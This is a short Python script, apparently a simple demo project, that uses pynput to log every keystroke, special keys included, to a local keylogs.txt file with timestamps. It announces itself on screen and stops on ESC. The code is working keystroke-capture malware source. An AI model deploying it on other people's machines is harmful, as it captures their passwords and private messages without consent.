# keylogger/main.py
from pynput import keyboard
import logging
import os

# Log file path
LOG_FILE = os.path.join(os.path.dirname(__file__), "..", "keylogs.txt")

# Set up logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
)

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")  # Handle special keys (e.g. space, enter)

def start_keylogger():
    print("🔒 Keylogger started (Press ESC to stop)...\nLogging to keylogs.txt")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        print("🛑 Keylogger stopped.")
        return False

if __name__ == "__main__":
    start_keylogger()
